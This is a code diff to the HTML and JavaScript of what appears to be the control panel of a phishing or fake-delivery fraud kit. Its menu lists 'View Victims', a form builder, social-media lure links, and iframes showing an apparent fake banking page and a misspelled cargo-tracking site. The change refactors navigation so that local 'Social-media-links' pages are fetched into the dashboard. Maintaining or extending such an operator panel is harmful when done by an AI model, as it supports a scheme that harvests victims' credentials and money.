@@ -109,15 +109,15 @@
 
 <!-- Sidebar -->
 <div class="sidebar" id="sidebarMenu">
-  <a href="form-builder.html">🎨 Form Builder</a>
-  <a href="forms.html">💾 Saved Forms</a>
-  <a href="feedback.html">📝 Feedback</a>
-  <a href="victims.html">🧠 View Victims</a>
-  <a href="members.html">👥 Members</a>
-  <a href="links.html">🔗 Links</a>
-  <a href="generate.html">🧾 Generate</a>
-  <a onclick="openIframe('bank')">🏦 Bank</a>
-  <a onclick="openIframe('tracking')">📦 Tracking (Carrier Federal)</a>
+  <a onclick="openPage('form-builder')">🎨 Form Builder</a>
+  <a onclick="openPage('forms')">💾 Saved Forms</a>
+  <a onclick="openPage('feedback')">📝 Feedback</a>
+  <a onclick="openPage('victims')">🧠 View Victims</a>
+  <a onclick="openPage('members')">👥 Members</a>
+  <a onclick="openPage('links')">🔗 Links</a>
+  <a onclick="openPage('generate')">🧾 Generate</a>
+  <a onclick="openPage('bank')">🏦 Bank</a>
+  <a onclick="openPage('tracking')">📦 Tracking (Carrier Federal)</a>
 </div>
 
 <!-- Main content -->
@@ -136,14 +136,39 @@
     sidebar.style.display = sidebar.style.display === "flex" ? "none" : "flex";
   });
 
-  // Load external sites in iframe
-  function openIframe(page) {
+  // Load pages
+  function openPage(page) {
     sidebar.style.display = "none";
+
+    const localPages = {
+      'form-builder': "Social-media-links/build.html",
+      'forms': "Social-media-links/forms.html",
+      'feedback': "Social-media-links/feedback.html",
+      'victims': "Social-media-links/victims.html",
+      'members': "Social-media-links/members.html",
+      'links': "Social-media-links/links.html",
+      'generate': "Social-media-links/generate.html",
+    };
+
     const iframePages = {
       'bank': "https://bulksms4.github.io/BANKING/",
       'tracking': "https://x-cargo-exprees.web.app/"
     };
-    if (iframePages[page]) {
+
+    if (localPages[page]) {
+      fetch(localPages[page])
+        .then(res => {
+          if (!res.ok) throw new Error("Page not found");
+          return res.text();
+        })
+        .then(html => {
+          contentDiv.innerHTML = html;
+        })
+        .catch(err => {
+          contentDiv.innerHTML = `<h2 style="color:red;">❌ ${err.message}</h2>`;
+        });
+    }
+    else if (iframePages[page]) {
       contentDiv.innerHTML = `<iframe src="${iframePages[page]}"></iframe>`;
     }
   }
